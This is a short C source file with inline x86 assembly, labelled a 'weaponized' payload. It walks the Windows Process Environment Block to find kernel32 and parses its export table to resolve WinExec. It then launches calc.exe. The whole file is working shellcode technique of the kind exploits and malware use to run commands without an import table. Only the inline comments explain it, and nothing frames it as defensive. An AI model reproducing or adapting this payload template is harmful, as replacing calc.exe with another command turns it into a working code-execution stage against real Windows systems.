// Weaponized WinExec Payload using PEB parsing
int main() {
    __asm__(
        "cld\n"
        "xor %ecx, %ecx\n"
        "push %ecx\n" // null terminator
        "push $0x6578652e\n" // exe.
        "push $0x636c6163\n" // clac (calc.exe)
        "mov %esp, %esi\n" // ESI points to "calc.exe\0" (we will use this later)

        "mov %fs:0x30, %ebx\n" // EBX = PEB
        "mov 0xc(%ebx), %ebx\n" // EBX = PEB_LDR_DATA
        "mov 0x14(%ebx), %ebx\n" // EBX = InMemoryOrderModuleList
        "mov (%ebx), %ebx\n" // EBX = ntdll module
        "mov (%ebx), %ebx\n" // EBX = kernel32 module
        "mov 0x10(%ebx), %ebx\n" // EBX = kernel32 base address

        "mov 0x3c(%ebx), %eax\n" // EAX = DOS header e_lfanew
        "add %ebx, %eax\n" // EAX = PE header
        "mov 0x78(%eax), %eax\n" // EAX = Export Directory RVA
        "add %ebx, %eax\n" // EAX = Export Directory Address

        "mov 0x20(%eax), %edx\n" // EDX = AddressOfNames RVA
        "add %ebx, %edx\n" // EDX = AddressOfNames Address
        
        "mov 0x18(%eax), %ecx\n" // ECX = NumberOfNames
        
        "find_winexec:\n"
        "jecxz not_found\n" // If we loop through all names and don't find it
        "dec %ecx\n"
        "mov (%edx, %ecx, 4), %edi\n" // EDI = Name RVA
        "add %ebx, %edi\n" // EDI = Name Address
        
        "cmpl $0x456e6957, (%edi)\n" // "WinE"
        "jne find_winexec\n"
        "cmpl $0x00636578, 4(%edi)\n" // "xec\0"
        "jne find_winexec\n"

        // Found WinExec!
        "mov 0x24(%eax), %edi\n" // EDI = AddressOfNameOrdinals RVA
        "add %ebx, %edi\n" // EDI = AddressOfNameOrdinals
        "movzwl (%edi, %ecx, 2), %ecx\n" // ECX = Ordinal

        "mov 0x1c(%eax), %edi\n" // EDI = AddressOfFunctions RVA
        "add %ebx, %edi\n" // EDI = AddressOfFunctions
        "mov (%edi, %ecx, 4), %eax\n" // EAX = WinExec RVA
        "add %ebx, %eax\n" // EAX = WinExec Address

        // Call WinExec(esi ("calc.exe"), 1)
        "push $1\n"
        "push %esi\n"
        "call *%eax\n"
        
        "not_found:\n"
    );
    return 0;
}
